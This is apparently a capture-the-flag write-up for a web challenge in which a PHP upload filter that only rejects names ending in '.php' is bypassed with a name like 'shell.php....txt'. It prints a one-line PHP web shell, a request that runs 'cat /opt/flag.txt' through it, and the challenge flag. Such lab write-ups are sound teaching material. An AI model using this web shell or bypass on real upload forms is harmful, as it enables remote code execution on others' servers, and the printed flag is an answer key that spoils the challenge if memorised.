*The developer has implemented a file upload filter. Can you find a way to bypass it and read the flag? [https://cybersecure-x-wavelength.chals.io/](https://)*

This challenge is based on a real-world vulnerability caused by weak server-side file upload validation and a mismatch in how the file is interpreted by the web server (Apache).

The PHP upload script uses a basic check:

```php
if (str_ends_with($filename, ".php")) {
    die("PHP files are not allowed!");
}
```

This only blocks filenames that **end exactly** with `.php`.
An attacker can name their file like:

```
shell.php........................................................txt
```

This leads to **Remote Code Execution (RCE)**:
```php
<?php if(isset($_GET['cmd'])) system($_GET['cmd']); ?>
```

Then access it like:
http://localhost:8080/uploads/shell.php...........txt?cmd=cat /opt/flag.txt

Flag:
`FLAG{rce_filename_bypass_1337}`
